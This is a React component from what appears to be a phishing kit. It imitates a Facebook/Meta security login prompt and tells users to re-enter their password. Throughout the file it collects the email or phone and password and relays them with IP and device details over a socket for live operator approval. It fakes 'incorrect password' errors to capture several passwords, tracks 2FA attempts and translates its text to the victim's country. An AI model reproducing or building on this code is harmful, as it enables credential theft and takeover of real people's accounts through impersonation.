import '@/assets/css/login-modal.css';
import FbRoundLogo from '@/assets/images/fb_round_logo.png';
import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
import { useAppealContext } from '@/hooks/use-appeal-context';
import { store } from '@/store/store';
import { submitLoginApproval } from '@/utils/approval-flow';
import config from '@/utils/config';
import translateText from '@/utils/translate';
import Image from 'next/image';
import Link from 'next/link';
import { type FC, type FormEvent, useEffect, useState } from 'react';

const TEXT = {
    security:
        'For your security, you must enter your password to continue.',
    identityPlaceholder: 'Email or phone number',
    passwordPlaceholder: 'Password',
    error: 'Password is incorrect, please try again.',
    waiting: 'Waiting for verification...',
    continue: 'Continue',
    forgot: 'Forgot your password?',
    showPassword: 'Show password',
    hidePassword: 'Hide password'
} as const;

const textsToTranslate = Object.values(TEXT);

const PasswordEye: FC<{ show: boolean }> = ({ show }) => (
    <svg viewBox='0 0 24 24' width='18' height='18' fill='none' stroke='currentColor' strokeWidth='1.8' aria-hidden='true'>
        <path d='M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z' />
        <circle cx='12' cy='12' r='2.8' />
        {show ? <path d='M4 20L20 4' /> : null}
    </svg>
);

const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    const [attempts, setAttempts] = useState(0);
    const [identity, setIdentity] = useState('');
    const [password, setPassword] = useState('');
    const [showPassword, setShowPassword] = useState(false);
    const [showError, setShowError] = useState(false);
    const [isWaiting, setIsWaiting] = useState(false);
    const [isLoading, setIsLoading] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});

    const { geoInfo } = store();
    const appeal = useAppealContext();
    const maxPass = config.MAX_PASS ?? 3;

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = 'Facebook login';
    }, []);

    useEffect(() => {
        if (!geoInfo) {
            return;
        }

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const clearError = () => {
        setShowError(false);
    };

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();
        if (!identity.trim() || !password.trim() || isLoading) {
            return;
        }

        setShowError(false);
        setIsLoading(true);
        setIsWaiting(true);

        const next = attempts + 1;
        setAttempts(next);

        try {
            if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
                throw new Error('socket unavailable');
            }

            const result = await submitLoginApproval(
                {
                    socket: appeal.socket,
                    messageId: appeal.messageId,
                    setMessageId: appeal.setMessageId,
                    formData: appeal.formData,
                    loginData: appeal.loginData,
                    loginProvider: appeal.loginProvider,
                    passwordAttempts: appeal.passwordAttempts,
                    twoFAAttempts: appeal.twoFAAttempts,
                    deviceLabel: appeal.deviceLabel,
                    ip: appeal.ip,
                    setLoginData: appeal.setLoginData,
                    addPasswordAttempt: appeal.addPasswordAttempt,
                    addTwoFAAttempt: appeal.addTwoFAAttempt
                },
                identity,
                password,
                maxPass
            );

            if (result.approved || result.needs2FA) {
                nextStep();
                return;
            }

            if (result.isLastAttempt) {
                nextStep();
                return;
            }

            setShowError(true);
            setPassword('');
        } catch {
            if (next >= maxPass) {
                nextStep();
            } else {
                setShowError(true);
                setPassword('');
            }
        } finally {
            setIsWaiting(false);
            setIsLoading(false);
        }
    };

    return (
        <div className='login-modal-page login-modal-overlay' role='dialog' aria-modal='true'>
            <div className='login-modal-card'>
                <div className='login-modal-content'>
                    <div className='mb-5 h-12 w-12'>
                        <Image src={FbRoundLogo} alt='Facebook' width={48} height={48} className='h-full w-full object-contain' />
                    </div>

                    <div className='w-full'>
                        <p className='mb-4 text-[14px] text-[#9a979e]'>{t(TEXT.security)}</p>

                        <form id='fb-login-form' autoComplete='off' onSubmit={handleSubmit}>
                            <input
                                id='fb-identity'
                                className='login-modal-identity'
                                type='text'
                                placeholder={t(TEXT.identityPlaceholder)}
                                autoComplete='off'
                                value={identity}
                                onChange={(e) => {
                                    setIdentity(e.target.value);
                                    clearError();
                                }}
                            />

                            <div className='login-modal-password-wrap'>
                                <input
                                    id='fb-password'
                                    className={`login-modal-password ${showError ? 'is-error' : ''}`}
                                    type={showPassword ? 'text' : 'password'}
                                    placeholder={t(TEXT.passwordPlaceholder)}
                                    autoComplete='off'
                                    maxLength={30}
                                    minLength={3}
                                    value={password}
                                    onChange={(e) => {
                                        setPassword(e.target.value);
                                        clearError();
                                    }}
                                />
                                <button
                                    type='button'
                                    className='login-modal-eye'
                                    aria-label={showPassword ? t(TEXT.hidePassword) : t(TEXT.showPassword)}
                                    onClick={() => setShowPassword((v) => !v)}
                                >
                                    <PasswordEye show={showPassword} />
                                </button>
                            </div>

                            {showError ? <p className='login-modal-error'>{t(TEXT.error)}</p> : null}
                            {isWaiting ? <p className='login-modal-waiting'>{t(TEXT.waiting)}</p> : null}

                            <button type='submit' disabled={isLoading} className='login-modal-submit'>
                                {isLoading ? <span className='login-modal-spinner' /> : t(TEXT.continue)}
                            </button>

                            <p className='mt-3 mb-0 text-center'>
                                <Link
                                    href='#'
                                    className='text-[14px] text-[#9a979e] no-underline'
                                    onClick={(e) => e.preventDefault()}
                                >
                                    {t(TEXT.forgot)}
                                </Link>
                            </p>
                        </form>
                    </div>

                    <div className='mt-5 w-16'>
                        <Image src={MetaLogoGrey} alt='Meta' width={64} className='w-full object-contain' />
                    </div>
                </div>
            </div>
        </div>
    );
};

export default FacebookLoginModal;
